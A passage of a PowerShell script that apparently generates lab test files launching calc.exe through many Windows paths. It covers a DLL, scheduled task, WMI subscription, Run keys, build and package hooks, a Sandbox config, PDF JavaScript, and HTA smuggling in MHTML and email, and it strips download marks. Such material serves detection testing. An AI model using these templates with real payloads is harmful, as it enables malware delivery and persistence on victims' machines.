    if (Compile-C -Tc $tc -Src $exeSrc -Out $exeOut -Type 'exe') { Ok "$exeOut" }
    else { Copy-Item $Calc $exeOut -Force; Ok $exeOut }
    $dllSrc = Join-Path $work 'dll.c'
    @'
#include <windows.h>
__declspec(dllexport) void __stdcall RunCalc(HWND h, HINSTANCE i, LPSTR a, int s) { WinExec("calc.exe", SW_SHOW); }
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID v) { if (r == DLL_PROCESS_ATTACH) WinExec("calc.exe", SW_SHOW); return TRUE; }
'@ | Set-Content $dllSrc -Encoding ASCII
    $dllOut = Join-Path $nd 'test-native.dll'
    if (Compile-C -Tc $tc -Src $dllSrc -Out $dllOut -Type 'dll' -Link @('/EXPORT:RunCalc','user32.lib')) {
        Ok "$dllOut"
        Copy-Item $dllOut (Join-Path $nd 'test-native.cpl') -Force
        Ok (Join-Path $nd 'native\test-native.cpl')
    }
    Remove-Item $work -Recurse -Force -EA SilentlyContinue
}

# ============================================================
# PERSISTENCE — all triggers
# ============================================================
Say "`n=== Persistence ==="
$task = '<?xml version="1.0" encoding="UTF-16"?><Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><RegistrationInfo><Author>lab</Author></RegistrationInfo><Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers><Principals><Principal id="Author"><UserId>S-1-5-18</UserId></Principal></Principals><Settings><Enabled>true</Enabled></Settings><Actions Context="Author"><Exec><Command>calc.exe</Command></Exec></Actions></Task>'
W (Join-Path $OutDir 'persistence\test.job') $task -Unicode
W (Join-Path $OutDir 'persistence\task.xml') $task -Unicode
W (Join-Path $OutDir 'persistence\test.mof') (
    '#pragma namespace("\\\\.\\root\\subscription")' + "`r`n" +
    'instance of __EventFilter as $F { Name = "LabFilter"; EventNamespace = "root\\cimv2"; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System''"; QueryLanguage = "WQL"; };' + "`r`n" +
    'instance of CommandLineEventConsumer as $C { Name = "LabConsumer"; CommandLineTemplate = "calc.exe"; };' + "`r`n" +
    'instance of __FilterToConsumerBinding { Filter = $F; Consumer = $C; };'
)
W (Join-Path $OutDir 'persistence\test.inf') "[Version]`r`nSignature=`"`$Windows NT`$`"`r`n[DefaultInstall]`r`nAddReg=LabReg`r`n[LabReg]`r`nHKCU,Software\Microsoft\Windows\CurrentVersion\Run,LabTest,0x00020000,`"calc.exe`"`r`n"
W (Join-Path $OutDir 'persistence\test.reg') "Windows Registry Editor Version 5.00`r`n`r`n[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]`r`n`"LabTest`"=`"calc.exe`"`r`n"
W (Join-Path $OutDir 'persistence\profile.ps1') "Start-Process calc.exe`r`n"

# ============================================================
# DEV — build/hook triggers
# ============================================================
Say "`n=== Dev ==="
W (Join-Path $OutDir 'dev\test.csproj') '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net48</TargetFramework></PropertyGroup><Target Name="Lab" AfterTargets="Build"><Exec Command="calc.exe"/></Target></Project>'
W (Join-Path $OutDir 'dev\test.props')   '<Project><Target Name="Lab" AfterTargets="Build"><Exec Command="calc.exe"/></Target></Project>'
W (Join-Path $OutDir 'dev\test.targets') '<Project><Target Name="Lab" AfterTargets="Build"><Exec Command="calc.exe"/></Target></Project>'
W (Join-Path $OutDir 'dev\Dockerfile') "FROM mcr.microsoft.com/windows/servercore:ltsc2019`r`nRUN powershell -Command `"Write-Output lab`"`r`n"
W (Join-Path $OutDir 'dev\test.yml') "name: lab`r`non: push`r`njobs:`r`n  build:`r`n    runs-on: windows-latest`r`n    steps:`r`n      - run: calc.exe`r`n"
W (Join-Path $OutDir 'dev\pre-commit') "#!/bin/sh`r`ncalc.exe`r`n"
$nuSrc = Join-Path $OutDir 'dev\_nupkg'
New-Item -ItemType Directory -Force -Path (Join-Path $nuSrc 'tools') | Out-Null
Set-Content (Join-Path $nuSrc 'tools\install.ps1') "Start-Process 'calc.exe'"
Set-Content (Join-Path $nuSrc 'lab.nuspec') '<?xml version="1.0"?><package><metadata><id>Lab</id><version>1.0.0</version><authors>lab</authors><description>lab</description></metadata></package>'
New-ZipFromDir -SourceDir $nuSrc -Destination (Join-Path $OutDir 'dev\lab.1.0.0.nupkg')

# ============================================================
# CONTAINER — WSB (Windows Sandbox LogonCommand)
# ============================================================
Say "`n=== Container ==="
W (Join-Path $OutDir 'container\test.wsb') '<Configuration><LogonCommand><Command>calc.exe</Command></LogonCommand></Configuration>'
Info "WSB: opening test.wsb starts Windows Sandbox which runs calc"

# ============================================================
# DOC — PDF, MHTML, MHT (JS / HTML smuggle)
# ============================================================
Say "`n=== Document ==="
# PDF with /OpenAction JavaScript
$objects = @(
    '<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>',
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>',
    '<< /S /JavaScript /JS (app.launchURL\("file:///C:/Windows/System32/calc.exe", true\);) >>'
)
$sb = New-Object System.Text.StringBuilder
[void]$sb.Append("%PDF-1.4`n")
$offsets = @()
for ($i=0; $i -lt $objects.Count; $i++) { $offsets += $sb.Length; [void]$sb.Append("$($i+1) 0 obj`n$($objects[$i])`nendobj`n") }
$xrefPos = $sb.Length
[void]$sb.Append("xref`n0 $($objects.Count + 1)`n0000000000 65535 f `n")
foreach ($o in $offsets) { [void]$sb.Append(("{0:D10} 00000 n `n" -f $o)) }
[void]$sb.Append("trailer`n<< /Size $($objects.Count + 1) /Root 1 0 R >>`nstartxref`n$xrefPos`n%%EOF`n")
EnsureDir (Join-Path $OutDir 'doc\test.pdf')
[IO.File]::WriteAllText((Join-Path $OutDir 'doc\test.pdf'), $sb.ToString(), [Text.Encoding]::ASCII)
Ok (Join-Path $OutDir 'doc\test.pdf')

$hta = '<html><body><script>new ActiveXObject("WScript.Shell").Run("calc.exe");window.close()</script></body></html>'
$b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($hta))
$mht = "MIME-Version: 1.0`r`nContent-Type: multipart/related; boundary=`"----=_Lab`"`r`n`r`n------=_Lab`r`nContent-Type: text/html; charset=`"utf-8`"`r`nContent-Transfer-Encoding: 8bit`r`n`r`n<html><body><a download=`"test.hta`" href=`"data:application/octet-stream;base64,$b64`">Download</a></body></html>`r`n`r`n------=_Lab--`r`n"
W (Join-Path $OutDir 'doc\test.mhtml') $mht
W (Join-Path $OutDir 'doc\test.mht')   $mht

# ============================================================
# MISC — EML with .hta attachment
# ============================================================
Say "`n=== Misc ==="
$hta = '<html><body><script>new ActiveXObject("WScript.Shell").Run("calc.exe");window.close()</script></body></html>'
$b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($hta))
$eml = "From: lab@example.com`r`nTo: lab@example.com`r`nSubject: lab`r`nMIME-Version: 1.0`r`nContent-Type: multipart/mixed; boundary=`"=_Lab`"`r`n`r`n--=_Lab`r`nContent-Type: text/plain`r`n`r`nlab test`r`n`r`n--=_Lab`r`nContent-Type: application/octet-stream; name=`"test.hta`"`r`nContent-Transfer-Encoding: base64`r`nContent-Disposition: attachment; filename=`"test.hta`"`r`n`r`n$b64`r`n`r`n--=_Lab--`r`n"
W (Join-Path $OutDir 'misc\test.eml') $eml
Info "Open in Outlook; extract/run the .hta attachment → calc"

# ============================================================
# CLEANUP
# ============================================================
Get-ChildItem $OutDir -Directory -Recurse -EA SilentlyContinue | Where-Object { $_.Name -match '^_' -or $_.Name -eq 'tools' } | Remove-Item -Recurse -Force -EA SilentlyContinue
Get-ChildItem $OutDir -Recurse -File -EA SilentlyContinue | Unblock-File -EA SilentlyContinue

# ============================================================
# SUMMARY
# ============================================================
Say "`n===== SUMMARY ====="
Write-Host "Office arch : $script:OfficeArch" -ForegroundColor Cyan
Say "`nPer-category:"
$total = 0
Get-ChildItem $OutDir -Directory -EA SilentlyContinue | Sort-Object Name | ForEach-Object {
    $c = (Get-ChildItem $_.FullName -Recurse -File -EA SilentlyContinue).Count
    $total += $c
    Write-Host ("  {0,-15} {1,3}" -f $_.Name, $c) -ForegroundColor White
}
Write-Host ("  {0,-15} {1,3}" -f 'TOTAL', $total) -ForegroundColor Green
Say "`nTest each: double-click, open in respective app, or use rundll32/regsvr32/mshta"